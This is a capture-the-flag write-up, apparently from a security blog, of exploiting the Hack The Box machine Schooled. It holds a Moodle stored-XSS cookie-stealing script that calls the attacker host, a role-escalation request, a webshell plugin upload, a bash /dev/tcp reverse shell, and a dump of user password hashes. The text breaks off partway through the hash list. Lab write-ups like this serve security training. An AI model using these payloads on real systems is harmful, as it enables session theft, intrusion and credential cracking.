---
title: HTB: Schooled
url: https://0xdf.gitlab.io/2021/09/11/htb-schooled.html
date: 2021-09-11T13:45:00+00:00
difficulty: Medium [30]
tags: ctf, htb-schooled, hackthebox, nmap, moodle, feroxbuster, wfuzz, vhosts, cve-2020-25627, cve-2020-14321, moodle-plugin, webshell, password-reuse, credentials, hashcat, pkg, freebsd, package, htb-teacher, oswe-like
---

![Schooled](https://0xdfimages.gitlab.io/img/schooled-cover.png)

Schooled starts with a string of exploits to gain more and more privilege in a Moodle instance, eventually leading to a malicious plugin upload that provides a webshell. I’ll pull some hashes from the DB and crack them to get to the next user. This user can run the FreeBSD package manager, pkg, as root, and can also write to the hosts file. I’ll trick it into connecting to my VM, and give it a malicious package that provide root. In Beyond Root, I’ll look at the Moodle plugin a bit more in depth.

## Box Info

| Name | [Schooled](https://hackthebox.com/machines/schooled)  [Schooled](https://hackthebox.com/machines/schooled) [Play on HackTheBox](https://hackthebox.com/machines/schooled) |
| --- | --- |
| Release Date | [03 Apr 2021](https://twitter.com/hackthebox_eu/status/1435619445238607877) |
| Retire Date | 11 Sep 2021 |
| OS | FreeBSD FreeBSD |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Schooled |
| Radar Graph | Radar chart for Schooled |
| First Blood User | 01:31:56[stoneric stoneric](https://app.hackthebox.com/users/57310) |
| First Blood Root | 01:58:38[Westar Westar](https://app.hackthebox.com/users/201940) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and something unknown on 33060:

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 13:50 EDT
Warning: 10.10.10.234 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.234
Host is up (0.095s latency).
Not shown: 51492 filtered ports, 14040 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 77.38 seconds
oxdf@parrot$ nmap -p 22,80,33060 -sCV -oA scans/nmap-tcpscripts 10.10.10.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 13:52 EDT
Nmap scan report for 10.10.10.234
Host is up (0.096s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=4/1%Time=6066086E%P=x86_64-pc-linux-gnu%r(NU
...[snip]...
SF:a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds

```

The host is running FreeBSD.

### schooled.htb - TCP 80

#### Site

The site is for a school:

[![image-20210401135637848](https://0xdfimages.gitlab.io/img/image-20210401135637848.png)](https://0xdfimages.gitlab.io/img/image-20210401135637848.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210401135637848.png)

At the very bottom of the page, there’s contact details and the footer that container the DNS name, `schooled.htb`.

![image-20210401135823357](https://0xdfimages.gitlab.io/img/image-20210401135823357.png)

![image-20210401135829512](https://0xdfimages.gitlab.io/img/image-20210401135829512.png)

Visiting this domain gives the same page as visiting by IP address.

There’s a link to a teachers page as well:

[![image-20210401150852197](https://0xdfimages.gitlab.io/img/image-20210401150852197.png)](https://0xdfimages.gitlab.io/img/image-20210401150852197.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210401150852197.png)

This will be useful later as I compromise their various accounts.

#### Directory Brute Force

Running [FeroxBuster](https://github.com/epi052/feroxbuster) against the site returned a few directories, but nothing interesting:

```

oxdf@parrot$ feroxbuster -u http://schooled.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://schooled.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       20w      234c http://schooled.htb/fonts
301        7l       20w      235c http://schooled.htb/images
301        7l       20w      231c http://schooled.htb/js
301        7l       20w      232c http://schooled.htb/css
301        7l       20w      247c http://schooled.htb/images/prettyPhoto
301        7l       20w      255c http://schooled.htb/images/prettyPhoto/default
301        7l       20w      256c http://schooled.htb/images/prettyPhoto/facebook
[####################] - 3m    239992/239992  0s      found:7       errors:227    
[####################] - 1m     29999/29999   448/s   http://schooled.htb
[####################] - 1m     29999/29999   412/s   http://schooled.htb/fonts
[####################] - 1m     29999/29999   417/s   http://schooled.htb/images
[####################] - 1m     29999/29999   399/s   http://schooled.htb/js
[####################] - 1m     29999/29999   392/s   http://schooled.htb/css
[####################] - 1m     29999/29999   394/s   http://schooled.htb/images/prettyPhoto
[####################] - 1m     29999/29999   416/s   http://schooled.htb/images/prettyPhoto/default
[####################] - 1m     29999/29999   494/s   http://schooled.htb/images/prettyPhoto/facebook

```

I poked at the `prettyPhoto` path, but nothing jumped out.

### VHost Brute Force

Because the host is using at least one domain name, I’ll check for subdomains with `wfuzz`. Right away one jumps out:

```

oxdf@parrot$ wfuzz -u http://10.10.10.234 -H "Host: FUZZ.schooled.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 20750
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.234/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000162:   200        1 L      5 W        84 Ch       "moodle"
000009532:   400        10 L     45 W       347 Ch      "#www"
000010581:   400        10 L     45 W       347 Ch      "#mail"

Total time: 69.01038
Processed Requests: 19966
Filtered Requests: 19963
Requests/sec.: 289.3187

```

[Moodle](https://moodle.org/) is an onlyine course work platform, so it definitely fits the box theme.

### moodle.schooled.htb - TCP 80

#### Site

This subdomain is in fact an instance of Moodle:

![image-20210401140807992](https://0xdfimages.gitlab.io/img/image-20210401140807992.png)

Clicking around the site, each of the courses doesn’t grant access, but requires me to log in:

![image-20210401140951801](https://0xdfimages.gitlab.io/img/image-20210401140951801.png)

#### Version / Vulnerabilities

I did some Googling and `searchsploit` for Moodle vulnerabilities, but there was a bunch of stuff, and the interesting ones were at least a few years old (like the one used in [Teacher](/2019/04/20/htb-teacher.html)). It would be helpful to know the version of Moodle here. The [Moodle GitHub](https://github.com/moodle/moodle) page shows files that might provide a hint to the version. There’s a `version.php` in the root of the repo, and it exists on Schooled as well at `/moodle/version.php`, but just returns a blank page. Still, now I can be oriented that `/moodle` is the base of the git repo.

There’s a list of dependencies at `/moodle/package.json`:

![image-20210401143254653](https://0xdfimages.gitlab.io/img/image-20210401143254653.png)

And a `/moodle/npm-shrinkwrap.json`:

![image-20210401143345306](https://0xdfimages.gitlab.io/img/image-20210401143345306.png)

At `/moodle/theme/upgrade.txt`, there’s a changelog that gives the current version, 3.9:

![image-20210401143607797](https://0xdfimages.gitlab.io/img/image-20210401143607797.png)

Still not much to find at this point. There is a [Moodle Security page](https://moodle.org/security/index.php). Scrolling through that does show that they are constantly patching XSS vulnerabilities, as well as SSRFs. I’ll keep an eye out for those.

#### Registration

At the login page, there’s a link to register:

![image-20210401141242899](https://0xdfimages.gitlab.io/img/image-20210401141242899.png)

It won’t accept any email that doesn’t come from `student.schooled.htb`:

![image-20210401141353641](https://0xdfimages.gitlab.io/img/image-20210401141353641.png)

I’ll add this subdomain to `/etc/hosts`, but it just loads the same page as the base domain.

When I update my email to 0xdf@student.schooled.htb, it accepts the submission, and takes me to a link to confirm the account. I’d guess this is typically where the link is emailed to the person registering, but that doesn’t work on HTB today.

![image-20210401141610678](https://0xdfimages.gitlab.io/img/image-20210401141610678.png)

On clicking Continue, it says my registration is confirmed, and redirects back to the page I was on, now logged in:

![image-20210401141646772](https://0xdfimages.gitlab.io/img/image-20210401141646772.png)

#### Enroll

Of the four courses, three of them say that you can’t enroll in this course. For example, Scientific Research:

![image-20210401142213978](https://0xdfimages.gitlab.io/img/image-20210401142213978.png)

On the other hand, Mathematics offers “self enrollment”:

![image-20210401142242252](https://0xdfimages.gitlab.io/img/image-20210401142242252.png)

On logging in and looking around, the Announcements section has a couple of posts:

![image-20210401142335290](https://0xdfimages.gitlab.io/img/image-20210401142335290.png)

The Reminder for joining students says that all students need to have a MoodleNet profile:

![image-20210401142418761](https://0xdfimages.gitlab.io/img/image-20210401142418761.png)

## Shell as www

### Moodle Access as Manuel

#### XXS POC

Any time I see a CTF machine suggest that someone will be checking things, I wonder if that’s a hint to some kind of automation, and in this case, would fit with the XSS vulnerabilities I already noticed. [This security report](https://moodle.org/mod/forum/discuss.php?d=410839#p1657001), MSA-20-0011: Stored XSS via moodlenetprofile parameter in user profile, seems to pull all of this together (CVE-2020-25627).

On the profile page, there’s a field for MoodleNet profile:

![image-20210401144331846](https://0xdfimages.gitlab.io/img/image-20210401144331846.png)

To see if this will work, I’ll create a simple payload that attempts to load a script from my server:

```

<script src="http://10.10.14.7/pwn.js"></script>

```

I’ll start a Python HTTP server (`python3 -m http.server 80`), and submit that as the MoodleNet profile. Almost instantly I get a hit back form my own IP trying to fetch the script:

```
10.10.14.7 - - [05/Apr/2021 14:47:18] code 404, message File not found
10.10.14.7 - - [05/Apr/2021 14:47:18] "GET /pwn.js HTTP/1.1" 404 -
10.10.14.7 - - [05/Apr/2021 14:47:18] code 404, message File not found
10.10.14.7 - - [05/Apr/2021 14:47:18] "GET /pwn.js HTTP/1.1" 404 -

```

The script does not exist, so my webserver returns 404 (and it looks like my browser tried a second time to fetch). That’s a good sign. It indicates that the `<script>` block was saved into the page, and if someone else tries to look at it, they will also try to load my script.

Less than a minute later, there’s another hit, from Schooled:

```
10.10.10.234 - - [05/Apr/2021 14:48:01] code 404, message File not found
10.10.10.234 - - [05/Apr/2021 14:48:01] "GET /pwn.js HTTP/1.1" 404 -
10.10.10.234 - - [05/Apr/2021 14:50:05] code 404, message File not found
10.10.10.234 - - [05/Apr/2021 14:50:05] "GET /pwn.js HTTP/1.1" 404 -

```

#### Steal Cookie

I’ll write a quick JavaScript payload that will generate a GET request back to me that includes the visiting user’s cookie:

```

var fetch_req = new XMLHttpRequest();
fetch_req.open("GET", "http://10.10.14.7/?cookie=" + document.cookie, false);           
fetch_req.send();

```

The next time Schooled requests the script, it immediately makes another request with the cookie:

```
10.10.10.234 - - [05/Apr/2021 14:52:09] "GET /pwn.js HTTP/1.1" 200 -
10.10.10.234 - - [05/Apr/2021 14:52:09] "GET /?cookie=MoodleSession=1d5priq1upigf4u74ej6c9nfvn HTTP/1.1" 200 -

```

In the firefox dev tools, in the Storage section, I’ll replace my `MoodleSession` cookie with the one I just got:

![image-20210401145439543](https://0xdfimages.gitlab.io/img/image-20210401145439543.png)

Now on visiting `http://moodle.schooled.htb/moodle`, I’m logged in as Manuel Phillips:

![image-20210401145519020](https://0xdfimages.gitlab.io/img/image-20210401145519020.png)

### Moodle Access as Lianne

#### Add Manual as Manager

From the initial page, Manuel is a Mathematics Lecturer. There’s not too much to find. There are no messages with information. No obvious places to get RCE or upload anything that could execute.

I turned back to the Moodle Security page, and two issues before the stored XSS, there’s another one that’s interesting, [Course enrolments allowed privilege escalation from teacher role into manager role](https://moodle.org/mod/forum/discuss.php?d=407393#p1644268) (MSA-20-0009, CVE-2021-14321).

[This GitHub page](https://github.com/HoangKien1020/CVE-2020-14321) has some sparse details on the exploit, including a link to a blog that is no longer up, and [this video on Vimeo](https://vimeo.com/441698193) showed the details of how to exploit it. I need to know someone who has the manager role. Back on the teachers page, Lianne Carter was listed as “Manager & English Lecturer”, so I can try her.

I’ll start by going to the Math class, and selecting Participants from the menu on the left. On that page, I’ll click the “Enrol users” button to get a form:

![image-20210401151238759](https://0xdfimages.gitlab.io/img/image-20210401151238759.png)

As I start to enter Lianne, it will autofill:

![image-20210401151313068](https://0xdfimages.gitlab.io/img/image-20210401151313068.png)

I’ll turn on intercept in Burp proxy, and click Enrol users. The resulting GET request has a ton of parameters:

```

GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=CIXNWKLP05&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=25&roletoassign=5&startdate=4&duration=

```

I’ll want to change the `userlist%5B%5D` number to Manuel’s id (which I can get from his profile page url to be 24), and change `roletoassign` from 5 (presumably student) to 1 (manager). Then I’ll forward the request on to Schooled. When the table loads, I’ll see Manuel is now has the Manager roll:

![image-20210401151707932](https://0xdfimages.gitlab.io/img/image-20210401151707932.png)

#### Fighting Resets

I can look around a bit more as a Manager, but there’s nothing obvious to try. However, the video above does continue to another step, which includes having the manager (Lianne) in the class.

The other thing is that there’s some kind of scheduled task that’s resetting the class list (Manual back to teacher and removing Lianna) every minute it seems. So I’m going to want to keep this enrol request in Repeater so I can easily send it again. In fact, I can use two tabs, or just change between user ids 24 and 25, but I’ll want to add both Manuel and Lianne as manager each time.

#### Impresonation

With a manager role for Manuel and Lianne in the class, if I click on Lianna, on her profile, there’s a link to “Log in as”:

![image-20210401170059238](https://0xdfimages.gitlab.io/img/image-20210401170059238.png)

CLicking that gives me the view as if I’m Lianne:

![image-20210401170125333](https://0xdfimages.gitlab.io/img/image-20210401170125333.png)

### Enable Full Permissions

As Lianne, I now have a new menu item at the very bottom on the left-side menu:

![image-20210401174412019](https://0xdfimages.gitlab.io/img/image-20210401174412019.png)

In that area, there is a Plugins section, but there’s not much I can do in the current state:

![image-20210401174457154](https://0xdfimages.gitlab.io/img/image-20210401174457154.png)

In the video, it shows how I can change the manager roll so that I can get access to install plugs.

In the Users menu, I’ll select Define roles under Permissions:

![image-20210401174846523](https://0xdfimages.gitlab.io/img/image-20210401174846523.png)

The resulting page shows the roles and what they can do. I’ll click the gear next to Manager:

![image-20210401174932321](https://0xdfimages.gitlab.io/img/image-20210401174932321.png)

The next page has a ton of options:

[![image-20210403154001024](https://0xdfimages.gitlab.io/img/image-20210403154001024.png)](https://0xdfimages.gitlab.io/img/image-20210403154001024.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210403154001024.png)

I’ll ignore all of them, turn on Burp Intercept, and click Save changes at the very bottom. The resulting POST request has a *ton* of parameters:

![image-20210401175046114](https://0xdfimages.gitlab.io/img/image-20210401175046114.png)

The [GitHub](https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions) has a POC to use as the body here. It’s important to note that the payload there starts with `&return=manage`, which is the second parameter in the payload in Burp:

![image-20210401175153658](https://0xdfimages.gitlab.io/img/image-20210401175153658.png)

It won’t work if I don’t include the `sesskey`, so I’ll replace the rest of the payload with the one from GitHub, leaving the `sesskey` intact, and then Forward the request.

Back on the Plugins page there’s more options:

![image-20210401175339054](https://0xdfimages.gitlab.io/img/image-20210401175339054.png)

### RCE

A Moodle Plugin is a zip file with a certain structure of folders and PHP files. There are different types of plugins that can be read about [here](https://docs.moodle.org/dev/Plugin_types). This [FAQ page](https://moodle.com/faq/how-do-i-create-a-moodle-plugin/) has a link to the [How-to guide](https://docs.moodle.org/dev/Blocks). While I could write my own, the GitHub POC I’ve been following has a [link](https://github.com/HoangKien1020/Moodle_RCE/blob/master/rce.zip) to `rce.zip` that provides a webshell (I’ll look at it in Beyond Root).

I’ll upload that via the administrator panel:

![image-20210401175829804](https://0xdfimages.gitlab.io/img/image-20210401175829804.png)

The next page shows a bunch of OKs (and a couple warnings) and I can click continue at the bottom:

![image-20210401175921082](https://0xdfimages.gitlab.io/img/image-20210401175921082.png)

Now the webshell is available:

```

oxdf@parrot$ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
uid=80(www) gid=80(www) groups=80(www)

```

It seems like the box is periodically cleaning up plugins as well.

### Shell

#### Initial

I’ll use the webshell to get a reverse shell. Interesting, even though the box is BSD, the Bash reverse shell works perfectly:

```

oxdf@parrot$ curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'" http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php

```

At `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.234] 41068
bash: cannot set terminal process group (1039): Can't assign requested address
bash: no job control in this shell
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ id
uid=80(www) gid=80(www) groups=80(www)

```

For people used to Linux, it’s worth noting that the web root isn’t `/var/www/html` as is typically seen there, but rather `/usr/local/www/apache24/data`.

#### Upgrade

Python doesn’t appear to be installed on the box:

```

[www@Schooled /]$ which python
[www@Schooled /]$ which python3

```

It took me a while to notice, but it is installed, just not on the `$PATH`:

```

[www@Schooled /]$ echo $PATH
/sbin:/bin:/usr/sbin:/usr/bin
[www@Schooled /]$ find / -name python3 2>/dev/null
/usr/local/bin/python3
/usr/local/share/bash-completion/completions/python3

```

From there, the standard shell upgrade trick works:

```

[www@Schooled /]$ /usr/local/bin/python3 -c 'import pty;pty.spawn("bash")'
[www@Schooled /]$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
Erase set to backspace.
[www@Schooled /]$ 

```

There’s one issue, the backspace key now prints `^?` instead of deleting back a character. [This post](https://www.ias.edu/math/computing/faq/set-my-backspace-key) showed how to fix it by entering `stty erase ^?` (where `^?` is entered by hitting backspace).

## Shell as jamie

### Enumeration

#### Home Directories

There are two uses with home directories:

```

[www@Schooled /home]$ ls
jamie
steve

```

www cannot access either.

#### www

Going back to what www can access, I’ll look around in the web application. There’s a `config.php` in `/usr/local/www/apache24/data/moodle` that contains the DB connection information:

```

[www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php 
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!

```

I tried to `su` to both users with the password “PlaybookMaster2020” without success.

#### Database

`mysql` is not in the path but installed. I’ll connect using the creds from above:

```

[www@Schooled /]$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1025
Server version: 8.0.23 Source distribution

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

moodle@localhost [moodle]>

```

Moodle creates a lot of tables, but I’m interesting in any that might contain passwords, like `mdl_user`. The table has a ton of columns, but I really just want username, email, and password:

```

moodle@localhost [moodle]> select username, email, password from mdl_user;
+-------------------+----------------------------------------+--------------------------------------------------------------+
| username          | email                                  | password                                                     |
+-------------------+----------------------------------------+--------------------------------------------------------------+
| guest             | root@localhost                         | $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 |
| admin             | jamie@staff.schooled.htb               | $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW |
| bell_oliver89     | bell_oliver89@student.schooled.htb     | $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK |
| orchid_sheila89   | orchid_sheila89@student.schooled.htb   | $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC |
| chard_ellzabeth89 | chard_elizabeth89@student.schooled.htb | $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC |
| morris_jake89     | morris_jake89@student.schooled.htb     | $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy |
| heel_james89      | heel_james89@student.schooled.htb      | $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim |
| nash_michael89    | nash_michael89@student.schooled.htb    | $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu |
| singh_rakesh89    | singh_rakesh89@student.schooled.htb    | $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu |
| taint_marcus89    | taint_marcus89@student.schooled.htb    | $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa |
| walls_shaun89     | walls_shaun89@student.schooled.htb     | $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga |
| smith_john89      | smith_john89@student.schooled.htb      | $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em |
| white_jack89      | white_jack89@student.schooled.htb      | $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK |
| travis_carl89     | travis_carl89@student.schooled.htb     | $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S |
| mac_amy89         | mac_amy89@student.schooled.htb         | $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i |
| james_boris89     | james_boris89@student.schooled.htb     | $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq |
| pierce_allan      | pierce_allan89@student.schooled.htb    | $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy |
| henry_william89   | henry_william89@student.schooled.htb   | $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu |
| harper_zoe89      | harper_zoe89@student.schooled.htb      | $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy |
| wright_travis89   | wright_travis89@student.schooled.htb   | $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm |
| allen_matthew89   | allen_matthew89@student.schooled.htb   | $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq |
| sanders_wallis89  | sanders_wallis89@student.schooled.htb  | $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u |
| higgins_jane      | higgins_jane@staff.schooled.htb        | $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 |
| phillips_manuel   | phillips_manuel@staff.schooled.htb     | $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG |
| carter_lianne     | carter_lianne@staff.schooled.htb       | $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe |
| parker_dan89      | parker_dan89@student.schooled.htb      | $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi |
| parker_tim89      | parker_tim89@student.schooled.htb      | $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S |
| 0xdf              | 0xdf@student.schooled.htb              | $2y$10$AmKUmB1aYnZKMrj/LoaYeefybrcq8mBU0JmEGKiXoDJtj0EFZBjza |
+-------------------+----------------------------------------+--------------------------------------------------------------+
28 rows in set (0.00 sec)

```

The admin username has an email address for jamie@staff.schooled.htb. I’ll use some command line foo to get them into hashcat format:

```

oxdf@parrot$ cat db_hashes | tr -d "|" | awk '{print $1":"$3}' | tee hashes
guest:$2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
admin:$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
bell_oliver89:$2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK
orchid_sheila89:$2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC
chard_ellzabeth89:$2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC
morris_jake89:$2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy
heel_james89:$2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
nash_michael89:$2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu
singh_rakesh89:$2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu
taint_marcus89:$2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa
walls_shaun89:$2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga
smith_john89:$2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em
white_jack89:$2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK
travis_carl89:$2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S
mac_amy89:$2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i
james_boris89:$2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq
pierce_allan:$2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy
henry_william89:$2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu
harper_zoe89:$2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy
wright_travis89:$2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm
allen_matthew89:$2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq
sanders_wallis89:$2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u
higgins_jane:$2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
phillips_manuel:$2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
carter_lianne:$2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
parker_dan89:$2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi
